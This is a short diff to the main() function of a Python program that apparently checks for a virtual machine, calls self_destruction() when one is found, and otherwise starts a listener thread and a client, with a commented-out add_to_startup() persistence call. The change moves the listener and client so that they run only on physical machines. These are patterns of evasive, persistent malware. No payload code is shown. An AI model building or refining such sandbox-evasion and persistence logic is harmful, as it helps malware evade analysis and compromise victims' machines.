@@ -69,10 +69,9 @@ def main():
         self_destruction()
     else:
         print("Running on a physical machine.")
-
-    # add_to_startup()
-    threading.Thread(target=start_listener).start()
-    start_client()
+    #   add_to_startup()
+        threading.Thread(target=start_listener).start()
+        start_client()
 
 
 if __name__ == '__main__':
